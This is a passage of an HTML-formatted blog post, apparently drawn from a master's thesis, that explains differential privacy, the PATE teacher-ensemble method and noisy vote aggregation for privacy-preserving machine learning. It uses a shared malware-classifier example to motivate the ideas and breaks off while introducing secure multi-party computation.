&lt;li&gt;Second, we will discuss the notion of &amp;ldquo;&lt;strong&gt;Differential Privacy&lt;/strong&gt;&amp;quot;, and explain why it is important and relevant to us.&lt;/li&gt;
&lt;li&gt;Finally, we will talk about how we combined both of these things in &lt;strong&gt;one system&lt;/strong&gt;, show how our approach compares to existing methods, and consider how it can be further improved.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;decentralized-machine-learning&#34;&gt;Decentralized Machine Learning&lt;/h2&gt;
&lt;p&gt;I do not think I have to re-emphasize how important &lt;a href=&#34;https://en.wikipedia.org/wiki/Machine_learning&#34;&gt;Machine Learning&lt;/a&gt; (or ML for short) has become in today&amp;rsquo;s society. It is used in virtually every field, or any sector of the industry: supply chain, medicine, finance, â¦ you name it!&lt;/p&gt;
&lt;p&gt;Of course, to train a Machine Learning model, you needâ¦ some &lt;strong&gt;data&lt;/strong&gt;!
And the more precise this data is, the more accurate your model will be.&lt;/p&gt;
&lt;p&gt;However, in certain fields, like medicine for instance, this data could be highly sensitive. Imagine a dataset of people suffering from Cancer, used to train medical predictive models.
But you can also think of private industrial processes, or financial figures, that you would not want to see out there, in the wild!&lt;/p&gt;
&lt;p&gt;And finally, in the case of these big Technology companies, like Facebook or Google: you are the product, and you are also the data creator. Facebook might want to train their speech recognition system on your voice messages, butâ¦ these messages are inherently private, and first and foremost, belong to you.&lt;/p&gt;
&lt;p&gt;In parallel, as we see today, there is a big incentive to decentralize the Machine Learning training process. And here, by &amp;ldquo;decentralizing&amp;rdquo; I do not mean run ML algorithms on different nodes, but rather having the training data taken away from the computation source.&lt;/p&gt;
&lt;p&gt;There are actually &lt;strong&gt;two&lt;/strong&gt; big incentives to do so:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The first one being when companies do not posess the in-house ressources (or even knowledge) to run their own analytics on their data. They tend to assign this task to a cloud providers (like &lt;a href=&#34;https://aws.amazon.com/fr/sagemaker/&#34;&gt;Amazon&lt;/a&gt;, &lt;a href=&#34;https://www.microsoft.com/en-us/research/project/automl/&#34;&gt;Microsoft&lt;/a&gt;, &lt;a href=&#34;https://cloud.google.com/automl/&#34;&gt;Google&lt;/a&gt;, &amp;hellip;) to run these expensive ML algorithm for them.
$\rightarrow$ This is a slightly related but a separated concern from ours, and it is often refered in the litterature as &amp;ldquo;&lt;strong&gt;Outsourced Computation&lt;/strong&gt;&amp;quot;.&lt;/li&gt;
&lt;li&gt;The second one is the one we are most interested in: when you want to run analytics on data that is spread across several different locations (i.e, machines, devices). The problem becomes particularly interesting when we cannot trust any entity to centrally aggregate all that data in one place.
$\rightarrow$ This problem of computing something with distant agents that do not neccesarily trust each others is refered as &amp;ldquo;&lt;strong&gt;Secure Computation&lt;/strong&gt;&amp;quot;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This last problem is exactly the one we discussed above, about big tech companies. Say you are willing to let Facebook train their algorithms on your voice messages. Still, you hope there is a way for them to extract the knowledge from these messages, without learning anything in particular that could directly identify you. And above all, you do not want to send them directly these messages! You don&amp;rsquo;t trust them. This would completely violate your privacy.&lt;/p&gt;
&lt;p&gt;Nevertheless, this is currently what is happening, as the scandals from these past weeks show us, despite Mark&amp;rsquo;s reassuring statements during his last keynote on April 11: &lt;br&gt;
11/04/2019 - &lt;a href=&#34;https://www.independent.co.uk/life-style/gadgets-and-tech/news/amazon-alexa-echo-listening-spy-security-a8865056.html&#34;&gt;Amazon admits employees listen to Alexa conversations&lt;/a&gt; / &lt;a href=&#34;https://www.forbes.com/sites/davidphelan/2019/04/12/amazon-confirms-staff-listen-to-alexa-conversations-heres-all-you-need-to-know/#6b979f8c5d9d&#34;&gt;Why does it matter&lt;/a&gt; &lt;br&gt;
13/08/2019 - &lt;a href=&#34;https://www.theguardian.com/technology/2019/aug/13/facebook-messenger-user-recordings-contractors-listening&#34;&gt;Facebook admits contractors listened to users&amp;rsquo; recordings without their knowledge&lt;/a&gt; &lt;br&gt;
15/08/2019 - &lt;a href=&#34;https://techcrunch.com/2019/08/15/daily-crunch-microsoft-admits-humans-can-listen-to-skype-cortana-audio/&#34;&gt;Microsoft admits humans can listen to Skype, Cortana audio&lt;/a&gt; &lt;br&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/Master-Thesis/marc-privacy.jpg&#34; width=&#34;600px&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This is the first of two concerns in Decentralized Machine Learning, that I will call &amp;ldquo;input privacy&amp;rdquo; (or input &lt;em&gt;secrecy&lt;/em&gt;). The second one being the &amp;ldquo;differential privacy&amp;rdquo; of the model, that we will dicuss in more details later on.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note that here, &amp;ldquo;input&amp;rdquo; has to be taken in the broader sense of &amp;ldquo;&lt;em&gt;whatever enters into the ML system&lt;/em&gt;&amp;quot;, and does not necessarily mean the raw data (your raw voice message, in the above example). For instance, if the raw data is a simple integer $x$, the input to the ML system could be a function $h(x)$ which computes $x \  \text{mod} \ 2$. Here, the evil server observing the input just sees a &amp;ldquo;0&amp;rdquo; or &amp;ldquo;1&amp;rdquo;, but it can still know the parity of $x$, and that is already a leakage, that combined with additional information might lead to a real compromision of a user&amp;rsquo;s privacy.&lt;/p&gt;
&lt;p&gt;Protecting not only the raw input itself, but also everything that have been infered from it, is of paramount importance. For instance, as we will see later in the article, in Distributed Stochastic Gradient Descent, the input to the DML system would be a gradient vector. But as we will see afterwards, even a simple gradient could leak a lot of information on the data it has been computed upon. In some very simple case, you can imagine the gradient as just a scaled version of the raw data.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;What I will call &lt;strong&gt;input privacy&lt;/strong&gt; is when you want to protect the secrecy or at least the privacy of the input itself, being a raw training data sample or any information you can infer about it from this input.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Differential privacy&lt;/strong&gt;, on the other hand, looks at the ML system as a whole, and cares about protecting the privacy of the training set, used to train the model. In other words, we want to address the question: &amp;ldquo;Just by looking at my model as a white-box, or even as a black-box, how much can an adversary learn about individual data samples it has been trained on?&amp;rdquo; &lt;br&gt;
â¦ and Guess what? A lot of things!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;White box&lt;/em&gt; means here that the adversary can inspect internal parameters of the model. In a &lt;em&gt;black box&lt;/em&gt; scenario, the ML system is reduced to a simple query mechanism: you input a sample, it outputs a prediction.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This leads us to talk about the three most common misconceptions people tend to have about Machine Learning:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;That ML is some kind of &lt;strong&gt;magic&lt;/strong&gt; box in which we put all our data into, and it will solve all the world&amp;rsquo;s biggest problems.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;That ML models makes completely reasonable, &lt;strong&gt;fair&lt;/strong&gt;, and undiscutable decisions.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;That it is absolutely &lt;strong&gt;safe&lt;/strong&gt; to use ML in any situation, on any data.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On this last point, I&amp;rsquo;m not so much talking about the reliability or &amp;ldquo;robustness&amp;rdquo; of a model (broken by things like evasion attacks or dataset poisoning), but more of the privacy guarantees of a trained model itself.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The first two of these misconceptions are being addressed by the Machine Learning community by respectively talking about the intricacies of fine-tuning to the general public, and pushing forward research in areas like &amp;ldquo;model interpretability&amp;rdquo; which try to circumvent the bias models may have when trained on biased datasets. Finally this &amp;ldquo;robustness&amp;rdquo; problem has been addressed by things like adversarial training, explained and theorisized as soon as in &lt;a href=&#34;https://arxiv.org/abs/1412.6572&#34;&gt;2014&lt;/a&gt;, but relates more to the &lt;strong&gt;Security&lt;/strong&gt; concerns of Machine Learning (&lt;a href=&#34;https://arxiv.org/pdf/1906.06449.pdf&#34;&gt;and might even harm its privacy aspects&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;However, the machine learning community seems to remain desperately blind to the last point, which considers the privacy risks of using machine learning on sensitive data.&lt;/p&gt;
&lt;p&gt;Indeed, there has been a lot of evidences in the litterature (&lt;a href=&#34;https://www.cs.cmu.edu/~mfredrik/papers/fjr2015ccs.pdf&#34;&gt;M.Fredrikson et al.&lt;/a&gt;, &lt;a href=&#34;https://arxiv.org/abs/1610.05820&#34;&gt;R.Shokri et al.&lt;/a&gt;) that &lt;em&gt;a trained model, even released as a black-box query system, leaks a lot of information about the data it has been trained on&lt;/em&gt;. This is particularly true with big models such as deep neural networks, that tend more to memorize the whole dataset instead of learning general patterns in the data distribution.&lt;/p&gt;
&lt;p&gt;An adversary can leverage two types of attacks against a machine learning model:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Membership inference attacks&lt;/strong&gt;, where the adversary learns whether or not a particular sample was part of the training dataset.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Model inversion attack&lt;/strong&gt;, where the adversary reverse-engineers the model from its internal parameters leading to partial or full reconstruction of data samples.
That&amp;rsquo;s how for instance &lt;a href=&#34;https://arxiv.org/abs/1802.08232&#34;&gt;some researchers&lt;/a&gt; have managed to extract and reconstruct credit cards and social security numbers from a model trained on scanned emails. Or to &lt;a href=&#34;https://www.cs.cmu.edu/~mfredrik/papers/fjr2015ccs.pdf&#34;&gt;recover some faces&lt;/a&gt; from the dataset used to train a facial recognition algorithm, just querying it and using information from the confidence score vectors.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/img/Master-Thesis/ModelInversionFredrikson.png&#34; alt=&#34;ModelInversionFredrikson&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;In the absolute worst-case scenario possible, publishing a trained model looks a bit like publishing the training dataset itself; as some machine learning models behave a lot more like a lookup table, than a general intelligence that can recognize and identify patterns.&lt;/p&gt;
&lt;p&gt;You might argue, in some less &amp;ldquo;extreme&amp;rdquo; cases than scanned emails (e.g: medical records of patients), even having access to the whole dataset is not such a big deal, right? After all, it is anonymized. All you can look at is a bunch of meaningless numbers!&lt;/p&gt;
&lt;p&gt;If you really think that, don&amp;rsquo;t worry, you just need a &lt;strong&gt;big recap&lt;/strong&gt; class on Privacy research. As the years taught us, Anonymization simply &lt;a href=&#34;https://techcrunch.com/2019/07/24/researchers-spotlight-the-lie-of-anonymous-data/&#34;&gt;&lt;strong&gt;does not work&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In Privacy research, we generally make no assumptions about the background knowledge of an adversary. Hence, by looking at the data itself, he might be able to infer a lot more things that you think.&lt;/p&gt;
&lt;p&gt;There have been techniques developped and used in Privacy-Preserving Information Publishing to reduce the granularity of data, like &lt;a href=&#34;https://desfontain.es/privacy/k-anonymity.html&#34;&gt;k-anonimity&lt;/a&gt;, &lt;a href=&#34;https://desfontain.es/privacy/k-map.html&#34;&gt;k-map&lt;/a&gt;, &lt;a href=&#34;https://desfontain.es/privacy/l-diversity.html&#34;&gt;l-diversity&lt;/a&gt;, &lt;a href=&#34;https://desfontain.es/PDFs/PhD/TClosenessPrivacyBeyondKAnonymityAndLDiversity.pdf&#34;&gt;t-closeness&lt;/a&gt;, &lt;a href=&#34;https://desfontain.es/privacy/delta-presence.html&#34;&gt;$\delta$-presence&lt;/a&gt;, etcâ¦ and I want to talk to you about Differential Privacy, which is a powerful defition that allows us to reason in the general case, without any assumptions, and formally quantify the amount of privacy leakage with mathematical rigour.&lt;/p&gt;
&lt;h2 id=&#34;differential-privacy&#34;&gt;Differential Privacy&lt;/h2&gt;
&lt;p&gt;Informally, a data process (say a machine learning algorithm, or a simpler computation on the data) is said to be &lt;em&gt;differentially private&lt;/em&gt; if its output run over 2 neighboring datasets is approximatively the same.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We call &lt;em&gt;neighbours datasets&lt;/em&gt;, two datasets only differing by one sample&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is what captured by this definition:
$$
\mathbb{P}[A(D_1)=O] \le e^\varepsilon\cdot\mathbb{P}[A(D_2)=O]
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Of course, we want epsilon to be as small as possible&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Imagine you have a database $D_1$ containing the salaries of $n$ people, from which you remove user &amp;ldquo;Joe&amp;rdquo; to obtain this second database $D_2$ of size $n-1$. We will define our algorithm &amp;ldquo;$A$&amp;rdquo; as a simple averaging operation. If our algorithm is differentially-private, it should respect this formula. In other terms, it should output approximately the same value on D1, or on D2, such that it would be undistinguishable for an adversary whether Joe was or not in the dataset, just by looking at this value.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/Master-Thesis/differential-privacy.png&#34; alt=&#34;differential-privacy&#34; style=&#34;zoom:30%;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;As you may imagine, this requires the algorithm to introduce some randomness (i.e some &lt;strong&gt;noise&lt;/strong&gt;) in the computation process.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Looking at the formula, from a Bayesian perspective, this &amp;ldquo;$\epsilon$&amp;rdquo; represents the &amp;ldquo;amount of a posteriori knowledge&amp;rdquo; that an attacker gains, after looking at the output of $A$.&lt;/p&gt;
&lt;p&gt;For instance, let&amp;rsquo;s say that an attacker was 50% certain that a target was in the dataset (i.e he has no clue), a $\epsilon$ of 1.1 would mean that by observing the output of $A$, he can &amp;ldquo;update&amp;rdquo; his suspicion to up to 75%.&lt;/p&gt;
&lt;p&gt;As the noise is inversely proportional to $\epsilon$, the bigger the noise, and the smaller $\epsilon$ is, hence increasing the uncertainty of an adversary and leading to good privacy guarantees. However, too much noise would completely destroy the utility of the algorithm.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Understanding this definition from an intuitive perspective will help us fully comprehend the rest of the article. A differentially-private ML training algorithm is no different from our example above of a differentially-private &amp;ldquo;salary averaging system&amp;rdquo;. The only difference is what we call $A$ here is the method used to &lt;strong&gt;train&lt;/strong&gt; a ML model. In this case, the output is the trained model (or rather the set $O$ of possible models) itself. I think this is what brings a lot of confusion. To me, it never made sense to say &amp;ldquo;this ML algo &lt;strong&gt;is&lt;/strong&gt; DP&amp;rdquo;. But I would rather say &amp;ldquo;this ML algorithm has been trained in a differentially-private manner&amp;rdquo;.&lt;/p&gt;
&lt;h2 id=&#34;differentially-private-machine-learning&#34;&gt;Differentially Private Machine Learning&lt;/h2&gt;
&lt;p&gt;I want to motivate the rest of the article by a simple example taken from the Threat Intelligence world:
Every day, companies receive thousands of malwares, and use anti-viruses and tools to detect and categorize these malwares. However, hackers are always more clever and now easily manage to evade those rule-based detection mechanisms. This led the security industry to design machine learning-based tools and rely on Threat Intelligence to classify new malwares.&lt;/p&gt;
&lt;p&gt;Each company typically has to adapt such a system to their infrastructure, by training these ML systems on large corpuses of evidences that they gathered. This data could be highly sensitive as it could include hostnames, IP addresses, memory dumps, parts of the filesystem, â¦&lt;/p&gt;
&lt;p&gt;However, companies (especially medium-size ones) generally cannot gather a huge amount of intelligence by themselves, and would benefit from other companies knowledge and insights. In his &lt;a href=&#34;https://www.ted.com/talks/caleb_barlow_where_is_cybercrime_really_coming_from&#34;&gt;TED Talk&lt;/a&gt;, Caleb Barlow, an ex-vice president of IBM security, compares cyberattacks to pandemics and show we should respond in the same way, and incentivize companies to openly share information about their breaches and infections.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;[â¦] Let&amp;rsquo;s think of the response we see to a healthcare pandemic: SARS, Ebola, bird flu, Zika. What is the top priority? It&amp;rsquo;s knowing who is infected and how the disease is spreading. Now, governments, private institutions, hospitals, physicians &amp;ndash; everyone responds openly and quickly. This is a collective and altruistic effort to stop the spread in its tracks and to inform anyone not infected how to protect or inoculate themselves.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Unfortunately, this is not at all what we see in response to a cyber attack. Organizations are far more likely to keep information on that attack to themselves. Why? Because they&amp;rsquo;re worried about competitive advantage, litigation or regulation. We need to effectively democratize threat intelligence data. We need to get all of these organizations to open up and share what is in their private arsenal of information. [â¦]&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This idealistic view might become reality if we can get rid of the fear companies would have to openly share potentially sensitive information. To my opinion, this fear is even more intense as the one we might have from Facebook reading personal conversations of users, as this one is specifically business- and profit-oriented.&lt;/p&gt;
&lt;p&gt;So let&amp;rsquo;s take this example of a malware classifier. We will consider a black-box machine learning algorithm (you might think of a deep neural network, or any kind of fancy architecture of your choice) which takes as input some suspicious files along with their context (extracted Indices Of Compromise (IOCs) and identified Tactics, Techniques and Procedures (TTPs)) and returns the category of the malware, one among these 10 classes:&lt;/p&gt;
&lt;img src=&#34;/img/Master-Thesis/malware-classifier.png&#34; width=&#34;600px&#34;&gt;
&lt;p&gt;That&amp;rsquo;s where we introduce the idea of &lt;strong&gt;Knowledge Transfer&lt;/strong&gt;. &lt;br&gt;
Remember, companies do not want to share their private information, but just the necessary knowledge one can extract from it to help train a global model, without taking the risking that the latter remembers any information that could be used to identify any of their data samples in particular.&lt;/p&gt;
&lt;p&gt;The idea goes as follows:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Each company trains a local model &lt;strong&gt;on their own private dataset&lt;/strong&gt;. We call these models &amp;ldquo;teacher models&amp;rdquo;, or simply &amp;ldquo;teachers&amp;rdquo;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Each of those models could have a different architecture, as long as they remain 10-classes classifiers as in the example above.
*&lt;u&gt;**NB:*&lt;em&gt;&lt;/u&gt; We assume (and this is a primordial assumption) that all companies&amp;rsquo; datasets are disjoint. In practice, one can check quite efficiently that the intersection between any two pairs of datasets is empty using &lt;a href=&#34;https://en.wikipedia.org/wiki/Private_set_intersection&#34;&gt;Private Set Intersection&lt;/a&gt; protocols.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Once all of these teacher models have been sufficiently trained, we ask them to &lt;strong&gt;predict on public data&lt;/strong&gt; samples. Their prediction is called a &amp;ldquo;vote&amp;rdquo;, and it only consists in the &lt;strong&gt;class&lt;/strong&gt; that their model predicted.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;&lt;u&gt;NB:&lt;/u&gt;&lt;/strong&gt;&lt;/em&gt; We will call &amp;ldquo;prediction&amp;rdquo; the output of a teacher model, and &amp;ldquo;vote&amp;rdquo; will refer to what the client send to the aggregator.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;We collect all these votes and aggregate them centrally, to perform some kind of &amp;ldquo;&lt;strong&gt;noisy majority voting&lt;/strong&gt;&amp;quot;: The class with the most votes is selected, and this public data sample is labeled accordingly.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Why noisy? Remember, we want to make our decision process differentially private, hence we put some noise on top of the votes, in order to mask their true count, and hide as much as possible individual contributions (see blue/orange histograms below).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;All these public data samples, alongside with their assigned labels, will constitute the training set of a final classifier, called a &amp;ldquo;student model&amp;rdquo;.
This last model can be formally proven to be differentially private, and hence could be safely released publicly, even as a white-box model.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This technique is refered as &amp;ldquo;&lt;a href=&#34;https://arxiv.org/pdf/1610.05755.pdf&#34;&gt;Private Aggregation of Teacher Ensembles&lt;/a&gt;&amp;rdquo; and has been first introduced by Nicolas Papernot and a team from Google Brain. The method provides an elegant way to guarantee the differential privacy of the student model, trained to copy the input-to-output mapping these multiple teacher models. And because no two teachers are trained on the same examples; &lt;em&gt;whenever they agree on what the output should be, we know that they agree because of a general pattern, rather than because they memorized something about their own training examples&lt;/em&gt;. Hence, it is safe to copy that knowledge into the Student.&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;as-a-parenthesis-the-confident-gn-max-protocol&#34;&gt;As a parenthesis: The Confident GN-MAX protocol&lt;/h4&gt;
&lt;p&gt;In an &lt;a href=&#34;https://arxiv.org/abs/1802.08908&#34;&gt;iteration to the PATE paper&lt;/a&gt;, Papernot devised a way to avoid the problem of misclassification in the case when teachers do not agree. We can decide &lt;strong&gt;not to asign any label&lt;/strong&gt; to a data sample if there is not a large enough consensus in teachers&amp;rsquo; predictions around a particular class.&lt;/p&gt;
&lt;p&gt;Starting from the observation that the more confident teachers are, the more we can inject noise without risking to perturb the distribution too much (hence overthrowing the candidate with most votes), it allows us to tighten our privacy bounds, by injecting more noise when teachers agree.
It is one of these rare cases where &lt;a href=&#34;https://infoscience.epfl.ch/record/255811/files/p665-guerraoui.pdf&#34;&gt;privacy and utility are compatible&lt;/a&gt;, and not conflicting each others.&lt;/p&gt;
&lt;p&gt;The CGNMAX procedure goes as follow:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Let $v$ be the final aggregated votes vector (the blue histogram below). We take its maximum value, and noise it with gaussian noise with a high variance $\sigma_1$.&lt;/li&gt;
&lt;li&gt;If the obtained value is not passed above a certain threshold $T$ that we can defined as &amp;ldquo;60% of the teachers&amp;rdquo; for instance, it means there was probably no clear consensus among the teachers. Hence, we do not assign any label to this public sample.&lt;/li&gt;
&lt;li&gt;Otherwise, we reiterate the noising mechanism: We noised the aggregated vote vector $v$ with a gaussian noise with smaller variance $\sigma_2$ (giving a more precise estimate on the true votes distribution), and select as our label the argmax of the obtained vector.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;We designed our two protocols below to perform this &amp;ldquo;consensus check&amp;rdquo; but for the sake of simplicity, we will not talk about it in this article.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;We might now think we can tick our two boxes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Differential privacy, â¦ &lt;strong&gt;Check!&lt;/strong&gt; The final model is differentially private, and an adversary will hardly find evidences of any individual data samples just by inspecting it.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Input privacy, â¦ &lt;strong&gt;Wait a minute..!&lt;/strong&gt; Even though we do not send the raw data sample to a server, there is still a central entity collecting and noisily aggregating the votes from every teacher. It means that &lt;u&gt;this entity leans any individual vote&lt;/u&gt;. To express it the same way as above, each teacher does not send $x$ but some $h(x)$ to the server, $h$ representing here their ML model. An adversary might infer a lot of information from that vote alone!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In our example of malware classifier, let&amp;rsquo;s assume an adversarial aggregator (server) has knowledge that the model of Company3 never predicts category &amp;ldquo;Trojan&amp;rdquo;, except if the company had trained it on some malwares containing &lt;a href=&#34;https://en.wikipedia.org/wiki/WannaCry_ransomware_attack&#34;&gt;WannaCry&lt;/a&gt; payloads. In that case, if the aggregator sees Company3 predicts &amp;ldquo;Trojan&amp;rdquo;, it can be pretty certain the company was previously affected by the nasty ransomware.&lt;/p&gt;
&lt;p&gt;Not only the individual votes, we really want to protect the whole distribution of votes. With sufficient background knowledge, an adversary might be able to deduce something from the blue histogram below, alone. It can for instance rely on extreme cases like classes that have zero votes, or exactly one vote.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If we consider this voting process itself as our differential privacy mechanism, this problem looks a bit like the &lt;a href=&#34;https://desfontain.es/privacy/local-global-differential-privacy.html&#34;&gt;Local vs. Global Differential Privacy&lt;/a&gt; problem, which put into perspective two paradigms:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In the &lt;strong&gt;Global DP&lt;/strong&gt; paradigm, a central aggregator collect data about individuals. Each of these individuals send their data to the aggregator without noise, and the latter is responsible to transform that data using a differentially private mechanise, i.e injecting the noise itself.&lt;/li&gt;
&lt;li&gt;In the &lt;strong&gt;Local DP&lt;/strong&gt; paradigm, the aggregator no longer has access to the &amp;ldquo;true&amp;rdquo; data, as each individual is reponsible to noise their data before sending it for aggregation.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The local differential privacy model has the advantage of getting rid of all trust we must have in the aggregator. However, since each individial needs to inject enough noise in their data to hide it properly from the aggregator, the aggregate result then become less accurate than in the global model where the differentially private mechanism is only applied once, and requires a lot less noise to still get a decent $\epsilon$.&lt;/p&gt;
&lt;p&gt;So to take again our example of malware classification, in our previous scheme, each individual teacher would send its vote to the aggregator. Once collected, the repartition of votes would look something like this:&lt;/p&gt;
&lt;img src=&#34;/img/Master-Thesis/histogram-votes.png&#34; width=&#34;700px&#34;&gt;
&lt;p&gt;It seems there is a big consensus around class &amp;ldquo;Adware&amp;rdquo; even though the class &amp;ldquo;Spyware&amp;rdquo; has a non negligeable weight. Teachers also have marginally voted for class &amp;ldquo;Phishing&amp;rdquo; and &amp;ldquo;Miner&amp;rdquo;. As always, there are also some outliers and &amp;ldquo;true&amp;rdquo; noise in these votes, misclassification could happen.&lt;/p&gt;
&lt;p&gt;On top of these votes, the aggregator adds some gaussian noise, with appropriate variance $\sigma^2$ to hide the true vote counts per class. The standard deviation  $\sigma$ has to be carefully selected and depends on our &amp;ldquo;privacy budget&amp;rdquo; $\epsilon$.
The new noisy histogram would look something like this:&lt;/p&gt;
&lt;img src=&#34;/img/Master-Thesis/histogram-noisy-votes.png&#34; width=&#34;700px&#34;&gt;
&lt;p&gt;We can see that the noise perturbed a bit the distribution, but kept the order of the two most prominent classes intact (although decreasing a bit the consensus formed around &lt;em&gt;&amp;ldquo;Adware&amp;rdquo;&lt;/em&gt; and increasing the importance of &lt;em&gt;&amp;ldquo;Spyware&amp;rdquo;&lt;/em&gt;). Therefore, the assigned label will remain &lt;em&gt;&amp;ldquo;Adware&amp;rdquo;&lt;/em&gt; in this case.&lt;/p&gt;
&lt;p&gt;This is not good enough, as the aggregator learns any individual vote. Indeed, &lt;strong&gt;he is responsible&lt;/strong&gt; for properly noising the votes, and receive them un-noised. A simple workaround would be to allow indeed each client to noise their own vote before sending it to the server / aggregator. Assuming we do want to have a total noise of variance $\sigma^2$, fortunately gaussian random variables add up nicely, and if we have $n$ teachers, we can have each one noising its vote with a gaussian noise of variance $\sigma^2/n$.&lt;/p&gt;
&lt;p&gt;However, this typically gives us a noise value so small that it cannot hide the true vote value from the aggregator (see on the graph below, the noised vote still shows a clear peak on the true class value). The final model will indeed be differentially private, it doesn&amp;rsquo;t change the algorithm, but it doesn&amp;rsquo;t REALLY respect the &amp;ldquo;input privacy&amp;rdquo; problem we talked about earlier.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;Un-noised vote&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Noised vote  â¢  $\mathcal{N}(\mu=0, \sigma = 0.3)$&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/one-vote.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;img src=&#34;/img/Master-Thesis/one-noisy-vote.png&#34; alt=&#34;&#34;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;Note that the argmax of an individual noised vote vector might not necessarily be representative of the true predicted class of this teacher, but as we sum these votes up, if the teachers agree, a clear majority should emerge anyway.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Also note that one &amp;ldquo;client&amp;rdquo; can train multiple teachers. It just had to divide its dataset into $m$ parts, train $m$ teacher models on those disjoint datasets, and aggregate their predictions in one vote vector, before sending it to the server (e.g: [0,0,12,0,0,2,0,1,0,0] for $m = 15$). In the local model, it would noise this vector with a variance equal to $m$ times the variance used to noise a single vote.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, true input privacy is only guaranteed if we trust a central aggregator. In our example, it could be a server from the Electronic Frontier Foundation, for instance. But in general, having a trusted unpartial server available to perform the aggregation is a very strong assumption.&lt;/p&gt;
&lt;p&gt;So, &lt;strong&gt;how can we get rid of that trust&lt;/strong&gt;? This is exactly the sort of question to which Secure Computation has the answer.&lt;/p&gt;
&lt;h2 id=&#34;secure-computation&#34;&gt;Secure Computation&lt;/h2&gt;
&lt;p&gt;Secure computation is a way to compute a function $y = f(x_1,x_2, â¦, x_n)$ on $n$ private inputs typically held by $n$ individuals (parties) which does not necessarily trust each other.
The output of the computation could be delivered to one or several input parties, or even a distinct individual. The latter should only lean the value $y$, and never learn about these inputs $x_1, x_2, â¦, x_n$.&lt;/p&gt;
&lt;p&gt;To solve our problem of aggregating teachers votes in a secure manner, we can use two different approaches:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;General Secure Multi-Party Computation&lt;/strong&gt; (MPC) protocols, which allow us to compute any type of function. That way, we will be able to compute the argmax of our noisy sum of votes&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Specific protocols, &lt;strong&gt;only tailored for secure aggregation&lt;/strong&gt;, i.e summing all these private inputs $x_1, x_2, â¦, x_n$.&lt;/p&gt;
